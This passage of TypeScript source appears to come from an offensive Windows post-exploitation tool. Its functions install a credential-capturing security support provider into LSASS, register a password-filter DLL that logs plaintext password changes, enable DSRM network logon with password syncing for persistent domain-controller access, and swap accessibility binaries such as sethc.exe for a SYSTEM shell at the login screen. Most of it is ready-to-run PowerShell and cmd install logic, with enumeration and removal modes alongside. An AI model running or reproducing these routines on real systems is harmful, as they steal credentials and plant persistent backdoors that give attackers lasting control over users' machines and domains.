        remediation: "Review and remove unknown SSPs from HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages.",
      })
    }
  }

  if (action === "install") {
    if (!dll) {
      output.push("ERROR: --dll required (path to SSP DLL)")
      output.push("")
      output.push("The SSP DLL must export:")
      output.push("  - SpLsaModeInitialize (SSP/AP interface)")
      output.push("")
      output.push("Example SSPs for credential capture:")
      output.push("  - mimilib.dll (mimikatz SSP — logs to kiwissp.log)")
      output.push("  - Custom DLL that hooks SpAcceptCredentials")
      output.push("")
      output.push("Two installation methods:")
      output.push("  --method api      — AddSecurityPackage (instant, no reboot, but lost on reboot)")
      output.push("  --method registry — Registry + reboot (persistent across reboots)")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== Installing SSP ==="
Write-Output "DLL: ${dll}"
Write-Output "Name: ${name}"
Write-Output "Method: ${method}"
Write-Output ""

# Verify admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
  Write-Output "[-] Administrator privileges required"
  Write-Output "STATUS=FAILED"
  exit
}

# Copy DLL to System32
$dllName = [System.IO.Path]::GetFileNameWithoutExtension('${dll}')
$dllFile = [System.IO.Path]::GetFileName('${dll}')
$destPath = "$env:SystemRoot\\System32\\$dllFile"
if (-not (Test-Path $destPath)) {
  Copy-Item '${dll}' $destPath -Force
  Write-Output "[+] DLL copied to: $destPath"
} else {
  Write-Output "[*] DLL already exists at: $destPath"
}

${
  method === "api"
    ? `
# Method 1: AddSecurityPackage API (instant, no reboot)
Write-Output ""
Write-Output "[*] Loading SSP via AddSecurityPackage..."
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SSPLoader {
  [StructLayout(LayoutKind.Sequential)]
  public struct SECURITY_PACKAGE_OPTIONS {
    public int Size;
    public int Type;
    public int Flags;
    public int SignatureSize;
    public IntPtr Signature;
  }
  [DllImport("secur32.dll", SetLastError = true)]
  public static extern int AddSecurityPackageW(
    [MarshalAs(UnmanagedType.LPWStr)] string pszPackageName,
    ref SECURITY_PACKAGE_OPTIONS pOptions);
}
"@ -ErrorAction SilentlyContinue

try {
  $opts = New-Object SSPLoader+SECURITY_PACKAGE_OPTIONS
  $opts.Size = [System.Runtime.InteropServices.Marshal]::SizeOf($opts)
  $result = [SSPLoader]::AddSecurityPackageW("$dllName", [ref]$opts)
  if ($result -eq 0) {
    Write-Output "[+] SSP loaded successfully via API"
    Write-Output "[+] Credentials will be captured on next logon"
    Write-Output "[!] Note: API method does NOT survive reboot"
    Write-Output "[*] For persistence, also run with --method registry"
    Write-Output "STATUS=SUCCESS"
  } else {
    Write-Output "[-] AddSecurityPackage returned: 0x$($result.ToString('X8'))"
    Write-Output "STATUS=PARTIAL"
  }
} catch {
  Write-Output "[-] API method failed: $_"
  Write-Output "[*] Falling back to registry method..."
  Write-Output "STATUS=FALLBACK"
}
`
    : ""
}

${
  method === "registry" || method !== "api"
    ? `
# Method 2: Registry (persistent, requires reboot or API call to take effect)
Write-Output ""
Write-Output "[*] Adding SSP to registry..."
$sspKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$current = (Get-ItemProperty $sspKey -Name 'Security Packages').'Security Packages'
if ($dllName -notin $current) {
  $updated = $current + $dllName
  Set-ItemProperty $sspKey -Name 'Security Packages' -Value $updated
  Write-Output "[+] Added '$dllName' to Security Packages registry"
  Write-Output "[+] SSP will load into LSASS on next boot"
  Write-Output "[!] Reboot required for registry method (or use --method api for instant)"
  Write-Output "STATUS=SUCCESS"
} else {
  Write-Output "[*] '$dllName' already in Security Packages"
  Write-Output "STATUS=EXISTS"
}
`
    : ""
}

Write-Output ""
Write-Output "[*] After installation, credentials are logged to:"
Write-Output "    - mimilib.dll: C:\\Windows\\System32\\kiwissp.log"
Write-Output "    - Custom DLL: depends on implementation"
Write-Output ""
Write-Output "Cleanup: winhook ssp_persist --action remove --name $dllName"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-SSP-012",
        provider: "windows",
        severity: "critical",
        status: "INSTALLED",
        resource: `lsa://ssp/${name}`,
        title: `SSP credential capture installed: ${name}`,
        details: `SSP DLL registered via ${method}. All future logon credentials will be captured in plaintext by LSASS.`,
        remediation: `Remove: winhook ssp_persist --action remove --name ${name}`,
      })
    }
  }

  if (action === "remove") {
    const targetName = argVal(args, "--name") || name
    const script = `
Write-Output "=== Removing SSP ==="

$sspKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$current = (Get-ItemProperty $sspKey -Name 'Security Packages').'Security Packages'
$filtered = $current | Where-Object { $_.Trim() -ne '${targetName}' }

if ($filtered.Count -lt $current.Count) {
  Set-ItemProperty $sspKey -Name 'Security Packages' -Value $filtered
  Write-Output "[+] Removed '${targetName}' from Security Packages registry"
} else {
  Write-Output "[*] '${targetName}' not found in Security Packages"
}

# Remove DLL
$dllPath = "$env:SystemRoot\\System32\\${targetName}.dll"
if (Test-Path $dllPath) {
  Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
  Write-Output "[+] DLL removed: $dllPath"
}

# Remove log file if mimilib
$logPath = "$env:SystemRoot\\System32\\kiwissp.log"
if (Test-Path $logPath) {
  Remove-Item $logPath -Force -ErrorAction SilentlyContinue
  Write-Output "[+] Credential log removed: $logPath"
}

Write-Output "[+] SSP removed (reboot may be needed to fully unload from LSASS)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function passwordFilter(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const filterName = argVal(args, "--name") || "CyberStrikePF"
  const findings: Finding[] = []
  const output: string[] = ["[*] Password filter DLL operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Password Filter (cmd.exe) ===\n")
    if (action === "enum") {
      const r = await cmd(
        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"`,
        timeout,
      )
      output.push("[*] Notification Packages:\n" + (r.stdout || "(query failed)"))
      const ppl = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "RunAsPPL"`, timeout)
      output.push(`\n[*] LSASS PPL: ${ppl.exitCode === 0 && ppl.stdout.includes("0x1") ? "ENABLED" : "DISABLED"}`)
      const policy = await cmd("net accounts", timeout)
      output.push("\n[*] Password policy:\n" + policy.stdout)
    }
    if (action === "install") {
      if (!dll) {
        output.push("ERROR: --dll required")
        return { output: output.join("\n"), findings }
      }
      const dllName = dll.replace(/\\/g, "/").split("/").pop()?.replace(".dll", "") || filterName
      const copy = await cmd(`copy "${dll}" "%SystemRoot%\\System32\\" /Y`, timeout)
      output.push(copy.exitCode === 0 ? `[+] DLL copied to System32` : `[!] Copy failed: ${copy.stderr}`)
      const r = await cmd(
        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"`,
        timeout,
      )
      const current = r.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim() || ""
      const add = await cmd(
        `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "${current}\\0${dllName}" /f`,
        timeout,
      )
      output.push(
        add.exitCode === 0
          ? `[+] Password filter '${dllName}' registered — reboot required\n[*] After reboot, every password change is captured`
          : `[!] Registry failed: ${add.stderr}`,
      )
      if (add.exitCode === 0)
        findings.push({
          checkId: "WIN-PF-010",
          provider: "windows",
          severity: "critical",
          status: "INSTALLED",
          resource: `lsa://password-filter/${filterName}`,
          title: `Password filter installed: ${filterName}`,
          details: "Filter loads into LSASS on next boot. All password changes captured.",
          remediation: `Remove from Notification Packages registry.`,
        })
    }
    if (action === "remove") {
      output.push("[*] To remove password filter via cmd.exe:")
      output.push(`    1. reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"`)
      output.push(`    2. reg add with updated value excluding '${filterName}'`)
      output.push(`    3. del "%SystemRoot%\\System32\\${filterName}.dll"`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Password Filter / Notification Packages ==="
Write-Output ""

# Notification Packages (password filters)
$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$notifPkgs = (Get-ItemProperty $lsaKey -Name 'Notification Packages' -ErrorAction SilentlyContinue).'Notification Packages'

Write-Output "Registered Notification Packages:"
$pkgCount = 0
$suspicious = 0
$knownPkgs = @('scecli', 'rassfm')

foreach ($pkg in $notifPkgs) {
  $trimmed = $pkg.Trim()
  if ($trimmed) {
    $pkgCount++
    $dllPath = "$env:SystemRoot\\System32\\$trimmed.dll"
    $exists = Test-Path $dllPath
    $sig = if ($exists) { (Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue).Status } else { 'N/A' }
    $isKnown = $trimmed.ToLower() -in $knownPkgs
    $marker = if (-not $isKnown) { ' [!] NON-STANDARD' } else { '' }

    Write-Output "  $trimmed — $(if ($exists) { if ($sig -eq 'Valid') { 'Signed' } else { 'UNSIGNED [!]' } } else { 'DLL NOT FOUND [!]' })$marker"
    if (-not $isKnown) { $suspicious++ }
  }
}
Write-Output ""
Write-Output "PKG_COUNT=$pkgCount"
Write-Output "SUSPICIOUS=$suspicious"

# Password policy info
Write-Output ""
Write-Output "=== Password Policy ==="
$policy = net accounts 2>&1
Write-Output $policy

# Check if password filters can be loaded (LSASS not PPL)
Write-Output ""
$ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
Write-Output "LSASS PPL: $(if ($ppl -eq 1) { 'ENABLED — custom filter DLL may be blocked' } else { 'DISABLED — filters load normally' })"
Write-Output "PPL=$ppl"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const suspicious = r.stdout.match(/SUSPICIOUS=(\d+)/)
    if (suspicious && parseInt(suspicious[1]) > 0) {
      findings.push({
        checkId: "WIN-PF-001",
        provider: "windows",
        severity: "critical",
        status: "SUSPICIOUS",
        resource: "lsa://notification-packages",
        title: `${suspicious[1]} non-standard password filter(s) found`,
        details:
          "Non-standard Notification Packages in LSASS may be capturing plaintext passwords on every password change.",
        remediation: "Review HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Notification Packages and remove unknown entries.",
      })
    }
  }

  if (action === "install") {
    if (!dll) {
      output.push("ERROR: --dll required (path to password filter DLL)")
      output.push("")
      output.push("The password filter DLL must export:")
      output.push("  - InitializeChangeNotify() → BOOL")
      output.push("  - PasswordChangeNotify(UserName, RelativeId, NewPassword) → NTSTATUS")
      output.push("  - PasswordFilter(AccountName, FullName, Password, SetOperation) → BOOL")
      output.push("")
      output.push("PasswordChangeNotify receives the plaintext password on every change.")
      output.push("Return TRUE from PasswordFilter to allow the change (FALSE rejects it).")
      output.push("")
      output.push("Requires reboot to take effect (LSASS loads filters at startup).")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== Installing Password Filter ==="
Write-Output "DLL: ${dll}"
Write-Output "Name: ${filterName}"
Write-Output ""

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
  Write-Output "[-] Administrator privileges required"
  Write-Output "STATUS=FAILED"
  exit
}

# Copy DLL to System32
$dllFile = [System.IO.Path]::GetFileName('${dll}')
$dllName = [System.IO.Path]::GetFileNameWithoutExtension('${dll}')
$destPath = "$env:SystemRoot\\System32\\$dllFile"
Copy-Item '${dll}' $destPath -Force
Write-Output "[+] DLL copied to: $destPath"

# Add to Notification Packages
$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$current = (Get-ItemProperty $lsaKey -Name 'Notification Packages').'Notification Packages'
if ($dllName -notin $current) {
  $updated = $current + $dllName
  Set-ItemProperty $lsaKey -Name 'Notification Packages' -Value $updated
  Write-Output "[+] Added '$dllName' to Notification Packages"
  Write-Output ""
  Write-Output "[!] REBOOT REQUIRED for password filter to load"
  Write-Output "[*] After reboot, every password change will be captured"
  Write-Output ""
  Write-Output "[*] Verification after reboot:"
  Write-Output "    - Check Event Log: System > Source: Scecli"
  Write-Output "    - Trigger: net user testuser NewP@ss123 /domain"
  Write-Output "    - Check output location (DLL-dependent)"
  Write-Output ""
  Write-Output "Cleanup: winhook password_filter --action remove --name $dllName"
  Write-Output "STATUS=SUCCESS"
} else {
  Write-Output "[*] '$dllName' already registered"
  Write-Output "STATUS=EXISTS"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-PF-011",
        provider: "windows",
        severity: "critical",
        status: "INSTALLED",
        resource: `lsa://password-filter/${filterName}`,
        title: `Password filter installed: ${filterName}`,
        details:
          "Password filter DLL will load into LSASS on next boot. All password changes will be captured in plaintext.",
        remediation: `Remove: winhook password_filter --action remove --name ${filterName}`,
      })
    }
  }

  if (action === "remove") {
    const targetName = argVal(args, "--name") || filterName
    const script = `
Write-Output "=== Removing Password Filter ==="

$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$current = (Get-ItemProperty $lsaKey -Name 'Notification Packages').'Notification Packages'
$filtered = $current | Where-Object { $_.Trim() -ne '${targetName}' }

if ($filtered.Count -lt $current.Count) {
  Set-ItemProperty $lsaKey -Name 'Notification Packages' -Value $filtered
  Write-Output "[+] Removed '${targetName}' from Notification Packages"
} else {
  Write-Output "[*] '${targetName}' not found"
}

$dllPath = "$env:SystemRoot\\System32\\${targetName}.dll"
if (Test-Path $dllPath) {
  Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
  Write-Output "[+] DLL removed: $dllPath"
}
Write-Output "[+] Filter removed (reboot needed to unload from LSASS)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function dsrmAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const syncAccount = argVal(args, "--sync-account")
  const findings: Finding[] = []
  const output: string[] = ["[*] DSRM (Directory Services Restore Mode) analysis...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== DSRM Analysis (cmd.exe) ===\n")
    const dcCheck = await wmic("computersystem get DomainRole /format:list", timeout)
    const domainRole = parseInt(dcCheck.stdout.match(/DomainRole=(\d+)/)?.[1] || "0")
    const isDC = domainRole >= 4
    output.push(`[*] DomainRole: ${domainRole} — ${isDC ? "Domain Controller" : "NOT a DC"}`)
    if (!isDC) {
      output.push("[-] DSRM attacks only apply to Domain Controllers")
      return { output: output.join("\n"), findings }
    }

    if (action === "check") {
      const dsrm = await cmd(
        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior"`,
        timeout,
      )
      const behavior = dsrm.stdout.match(/0x(\d+)/)?.[1] || "not set"
      output.push(`\n[*] DsrmAdminLogonBehavior: ${behavior}`)
      if (behavior === "2") {
        output.push("[!] Value 2 — DSRM admin can logon ANYTIME via network (EXPLOITABLE)")
        findings.push({
          checkId: "WIN-DSRM-001",
          provider: "windows",
          severity: "critical",
          status: "EXPLOITABLE",
          resource: "dc://dsrm",
          title: "DSRM network logon enabled (DsrmAdminLogonBehavior=2)",
          details: "DSRM admin can log on via network anytime. Persistent DC access.",
          remediation: "Set DsrmAdminLogonBehavior to 0.",
        })
      } else {
        output.push(`[*] Default/secure — DSRM admin restricted`)
        findings.push({
          checkId: "WIN-DSRM-002",
          provider: "windows",
          severity: "medium",
          status: "INFO",
          resource: "dc://dsrm",
          title: "DC found — DSRM network logon can be enabled",
          details: "Use --action enable-network to enable DSRM network logon.",
          remediation: "Monitor DsrmAdminLogonBehavior for changes.",
        })
      }
      const ntdsutil = await cmd("where ntdsutil", timeout)
      output.push(`\n[*] ntdsutil available: ${ntdsutil.exitCode === 0 ? "YES" : "NO"}`)
    }
    if (action === "enable-network") {
      const r = await cmd(
        `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`,
        timeout,
      )
      output.push(
        r.exitCode === 0
          ? "[+] DsrmAdminLogonBehavior set to 2\n[+] DSRM admin can now logon via network"
          : `[!] Failed: ${r.stderr}`,
      )
      if (r.exitCode === 0)
        findings.push({
          checkId: "WIN-DSRM-010",
          provider: "windows",
          severity: "critical",
          status: "BACKDOORED",
          resource: "dc://dsrm",
          title: "DSRM network logon enabled — persistent DC backdoor",
          details: "DsrmAdminLogonBehavior=2. Sync password for persistent access.",
          remediation: "Set to 0. Rotate DSRM password.",
        })
    }
    if (action === "sync-password") {
      if (!syncAccount) {
        output.push("ERROR: --sync-account required")
        return { output: output.join("\n"), findings }
      }
      const r = await cmd(`ntdsutil "set dsrm password" "sync from domain account ${syncAccount}" quit quit`, timeout)
      output.push(r.stdout || r.stderr)
      output.push(
        r.stdout.includes("successfully") ? `[+] DSRM password synced with ${syncAccount}` : "[!] Sync may have failed",
      )
    }
    if (action === "disable") {
      const r = await cmd(
        `reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior" /f`,
        timeout,
      )
      output.push(r.exitCode === 0 ? "[+] DsrmAdminLogonBehavior removed (defaults to 0)" : `[!] Failed: ${r.stderr}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
Write-Output "=== DSRM Configuration Check ==="
Write-Output ""

# Check if this is a Domain Controller
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
Write-Output "Is Domain Controller: $isDC"
Write-Output "IS_DC=$(if ($isDC) { '1' } else { '0' })"

if (-not $isDC) {
  Write-Output "[-] DSRM attacks only apply to Domain Controllers"
  exit
}

# Check DsrmAdminLogonBehavior
$dsrmKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$dsrmBehavior = (Get-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue).DsrmAdminLogonBehavior

Write-Output ""
Write-Output "=== DsrmAdminLogonBehavior ==="
switch ($dsrmBehavior) {
  0 { Write-Output "Value: 0 — DSRM admin can only logon in DSRM boot mode (DEFAULT, secure)" }
  1 { Write-Output "Value: 1 — DSRM admin can logon when AD is stopped (medium risk)" }
  2 { Write-Output "[!] Value: 2 — DSRM admin can logon ANYTIME via network (EXPLOITABLE)" }
  $null { Write-Output "Value: NOT SET — defaults to 0 (DSRM boot mode only)" }
  default { Write-Output "Value: $dsrmBehavior (unknown)" }
}
Write-Output "DSRM_BEHAVIOR=$dsrmBehavior"

# Check DSRM password status
Write-Output ""
Write-Output "=== DSRM Password Info ==="
Write-Output "[*] DSRM password is set during dcpromo and stored locally"
Write-Output "[*] It is the local Administrator password for the DC"
Write-Output "[*] Cannot be read directly — must be synced or cracked from SAM"

# Check ntdsutil availability
$ntdsutil = Get-Command ntdsutil -ErrorAction SilentlyContinue
Write-Output ""
Write-Output "ntdsutil available: $(if ($ntdsutil) { 'YES' } else { 'NO' })"

# Check if DSRM account is the built-in Administrator
Write-Output ""
Write-Output "=== Local Administrator (DSRM) Account ==="
$admin = Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True AND SID LIKE 'S-1-5-%-500'"
if ($admin) {
  Write-Output "Name: $($admin.Name)"
  Write-Output "Disabled: $($admin.Disabled)"
  Write-Output "Lockout: $($admin.Lockout)"
  Write-Output "PasswordChangeable: $($admin.PasswordChangeable)"
  Write-Output "PasswordRequired: $($admin.PasswordRequired)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const isDC = r.stdout.includes("IS_DC=1")
    const dsrmBehavior = r.stdout.match(/DSRM_BEHAVIOR=(\d*)/)

    if (isDC && dsrmBehavior && dsrmBehavior[1] === "2") {
      findings.push({
        checkId: "WIN-DSRM-011",
        provider: "windows",
        severity: "critical",
        status: "EXPLOITABLE",
        resource: "dc://dsrm",
        title: "DSRM network logon enabled (DsrmAdminLogonBehavior=2)",
        details:
          "The DSRM administrator can log on via the network at any time. If the DSRM password is known or synced, this provides persistent DC access that survives AD password resets.",
        remediation: "Set DsrmAdminLogonBehavior to 0 or remove the registry value.",
      })
    }

    if (isDC && (!dsrmBehavior || dsrmBehavior[1] !== "2")) {
      findings.push({
        checkId: "WIN-DSRM-012",
        provider: "windows",
        severity: "medium",
        status: "INFO",
        resource: "dc://dsrm",
        title: "DC found — DSRM network logon can be enabled for persistence",
        details:
          "DsrmAdminLogonBehavior is not set to 2. Use --action enable-network to enable DSRM network logon, then sync the password with a known account.",
        remediation: "Monitor DsrmAdminLogonBehavior registry value for changes.",
      })
    }
  }

  if (action === "enable-network") {
    const script = `
Write-Output "=== Enabling DSRM Network Logon ==="
Write-Output ""

$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
if (-not $isDC) {
  Write-Output "[-] Not a Domain Controller"
  Write-Output "STATUS=FAILED"
  exit
}

$dsrmKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
$current = (Get-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue).DsrmAdminLogonBehavior

Write-Output "Current DsrmAdminLogonBehavior: $(if ($current -ne $null) { $current } else { 'NOT SET (default 0)' })"
Write-Output ""

Set-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -Value 2 -Type DWord -Force
$verify = (Get-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior).DsrmAdminLogonBehavior
Write-Output "[+] DsrmAdminLogonBehavior set to: $verify"
Write-Output "[+] DSRM admin can now logon via network at any time"
Write-Output ""
Write-Output "[*] Next steps:"
Write-Output "    1. Sync DSRM password: winhook dsrm_abuse --action sync-password --sync-account ADMIN_ACCOUNT"
Write-Output "    2. Or use known DSRM password with pass-the-hash:"
Write-Output "       winhook overpass_hash --user Administrator --hash DSRM_HASH --domain DC_HOSTNAME"
Write-Output "       (Use DC hostname, NOT domain name — DSRM is a LOCAL account)"
Write-Output ""
Write-Output "Cleanup: winhook dsrm_abuse --action disable"
Write-Output "STATUS=SUCCESS"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-DSRM-013",
        provider: "windows",
        severity: "critical",
        status: "BACKDOORED",
        resource: "dc://dsrm",
        title: "DSRM network logon enabled — persistent DC backdoor",
        details:
          "DsrmAdminLogonBehavior set to 2. DSRM admin can authenticate via network. Sync password with a known account for persistent access.",
        remediation: "Set DsrmAdminLogonBehavior back to 0. Rotate DSRM password.",
      })
    }
  }

  if (action === "sync-password") {
    if (!syncAccount) {
      output.push("ERROR: --sync-account required (domain account to sync DSRM password with)")
      output.push("")
      output.push("This syncs the DSRM password to match a domain account's password.")
      output.push("After sync, use that account's NTLM hash to authenticate as DSRM admin.")
      output.push("")
      output.push("Example: winhook dsrm_abuse --action sync-password --sync-account krbtgt")
      return { output: output.join("\n"), findings }
    }

    const script = `
Write-Output "=== DSRM Password Sync ==="
Write-Output "Syncing DSRM password with: ${syncAccount}"
Write-Output ""

$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
if (-not $isDC) {
  Write-Output "[-] Not a Domain Controller"
  Write-Output "STATUS=FAILED"
  exit
}

# Use ntdsutil to sync DSRM password
Write-Output "[*] Running ntdsutil to sync DSRM password..."
Write-Output "[*] Command: ntdsutil 'set dsrm password' 'sync from domain account ${syncAccount}' quit quit"
Write-Output ""

$result = ntdsutil "set dsrm password" "sync from domain account ${syncAccount}" quit quit 2>&1
Write-Output $result
Write-Output ""

if ($result -match 'successfully') {
  Write-Output "[+] DSRM password synced with ${syncAccount}"
  Write-Output "[+] Use ${syncAccount}'s NTLM hash to authenticate as DSRM admin:"
  Write-Output "    winhook overpass_hash --user Administrator --hash <${syncAccount}_NTLM_HASH> --domain $(hostname)"
  Write-Output ""
  Write-Output "[!] Remember: Use DC HOSTNAME as domain, not the AD domain name"
  Write-Output "    DSRM is a LOCAL account on the DC"
  Write-Output "STATUS=SUCCESS"
} else {
  Write-Output "[-] Sync may have failed — check output above"
  Write-Output "[*] Alternative: Set DSRM password manually via ntdsutil"
  Write-Output "STATUS=UNKNOWN"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "disable") {
    const script = `
Write-Output "=== Disabling DSRM Network Logon ==="
$dsrmKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
Remove-ItemProperty $dsrmKey -Name DsrmAdminLogonBehavior -Force -ErrorAction SilentlyContinue
Write-Output "[+] DsrmAdminLogonBehavior removed (defaults to 0 — DSRM boot mode only)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function accessibilityBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const target = argVal(args, "--target") || "sethc"
  const payload = argVal(args, "--payload") || "cmd.exe"
  const findings: Finding[] = []
  const output: string[] = ["[*] Accessibility features backdoor...\n"]

  const targets: Record<string, { exe: string; trigger: string }> = {
    sethc: { exe: "sethc.exe", trigger: "Press Shift 5 times at login screen" },
    utilman: { exe: "utilman.exe", trigger: "Press Win+U at login screen" },
    narrator: { exe: "Narrator.exe", trigger: "Press Win+Enter at login screen" },
    osk: { exe: "osk.exe", trigger: "Click On-Screen Keyboard from Ease of Access" },
    magnify: { exe: "Magnify.exe", trigger: "Press Win+Plus at login screen" },
  }

  const t = targets[target]
  if (!t) {
    output.push(`ERROR: Unknown target '${target}'. Valid: ${Object.keys(targets).join(", ")}`)
    return { output: output.join("\n"), findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Accessibility Backdoor (cmd.exe) ===\n")
    if (action === "check") {
      for (const [name, info] of Object.entries(targets)) {
        const targetPath = `%SystemRoot%\\System32\\${info.exe}`
        const ifeo = await cmd(
          `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${info.exe}" /v "Debugger"`,
          timeout,
        )
        if (ifeo.exitCode === 0) {
          output.push(`[!] ${info.exe} — IFEO Debugger set: ${ifeo.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim()}`)
        }
        const exists = await cmd(`if exist "${targetPath}" (echo EXISTS) else (echo MISSING)`, timeout)
        output.push(`[*] ${info.exe} — ${exists.stdout.includes("EXISTS") ? "present" : "MISSING"} (${info.trigger})`)
      }
      const rdp = await cmd(
        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v "fDenyTSConnections"`,
        timeout,
      )
      output.push(`\n[*] RDP: ${rdp.stdout.includes("0x0") ? "ENABLED" : "DISABLED"}`)
    }
    if (action === "install") {
      const targetPath = `%SystemRoot%\\System32\\${t.exe}`
      const backupPath = `%SystemRoot%\\System32\\${t.exe}.bak`
      const backup = await cmd(`if not exist "${backupPath}" copy "${targetPath}" "${backupPath}" /Y`, timeout)
      output.push(backup.exitCode === 0 ? `[+] Original backed up` : `[*] Backup may exist or failed`)
      const own = await cmd(`takeown /f "${targetPath}" /a`, timeout)
      output.push(own.exitCode === 0 ? "[+] Ownership taken" : `[!] takeown failed: ${own.stderr}`)
      const acl = await cmd(`icacls "${targetPath}" /grant Administrators:F`, timeout)
      output.push(acl.exitCode === 0 ? "[+] Permissions granted" : `[!] icacls failed: ${acl.stderr}`)
      const r = await cmd(`copy "%SystemRoot%\\System32\\${payload}" "${targetPath}" /Y`, timeout)
      if (r.exitCode === 0) {
        output.push(`[+] ${t.exe} replaced with ${payload}`)
        output.push(`[+] Trigger: ${t.trigger}`)
        output.push(`[+] Result: SYSTEM shell at login screen`)
        findings.push({
          checkId: "WIN-ACC-010",
          provider: "windows",
          severity: "critical",
          status: "BACKDOORED",
          resource: `accessibility://${target}`,
          title: `Accessibility backdoor: ${t.exe} → ${payload}`,
          details: `${t.trigger} spawns ${payload} as SYSTEM.`,
          remediation: `Restore: copy "${backupPath}" "${targetPath}" /Y`,
        })
      } else {
        output.push(`[!] Copy failed — trying IFEO debugger method...`)
        const ifeo = await cmd(
          `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}" /v "Debugger" /t REG_SZ /d "%SystemRoot%\\System32\\${payload}" /f`,
          timeout,
        )
        output.push(
          ifeo.exitCode === 0 ? `[+] IFEO debugger set: ${t.exe} → ${payload}` : `[!] IFEO failed: ${ifeo.stderr}`,
        )
        if (ifeo.exitCode === 0)
          findings.push({
            checkId: "WIN-ACC-011",
            provider: "windows",
            severity: "critical",
            status: "BACKDOORED",
            resource: `accessibility://${target}`,
            title: `IFEO backdoor: ${t.exe} → ${payload}`,
            details: `${t.trigger} spawns ${payload}.`,
            remediation: `Remove: reg delete "HKLM\\...\\Image File Execution Options\\${t.exe}" /v "Debugger" /f`,
          })
      }
    }
    if (action === "remove") {
      const backupPath = `%SystemRoot%\\System32\\${t.exe}.bak`
      const targetPath = `%SystemRoot%\\System32\\${t.exe}`
      await cmd(`takeown /f "${targetPath}" /a`, timeout)
      await cmd(`icacls "${targetPath}" /grant Administrators:F`, timeout)
      const restore = await cmd(
